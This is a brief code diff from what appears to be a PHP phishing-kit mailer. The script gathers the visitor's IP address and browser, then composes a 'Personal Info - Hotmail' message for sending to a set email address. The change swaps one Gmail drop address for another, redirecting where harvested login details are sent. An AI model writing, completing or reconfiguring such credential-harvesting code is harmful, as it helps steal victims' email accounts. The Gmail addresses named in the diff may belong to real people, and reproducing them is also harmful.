@@ -29,7 +29,7 @@ if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
 $ip = getenv("REMOTE_ADDR");
 $agent=$_SERVER['HTTP_USER_AGENT'];
 
-$email= "billionbox000@gmail.com";
+$email= "olivia.ainsworth01@gmail.com";
 
 
 $message  = "==================+[ Personal Info - Hotmail ]+==================\n";
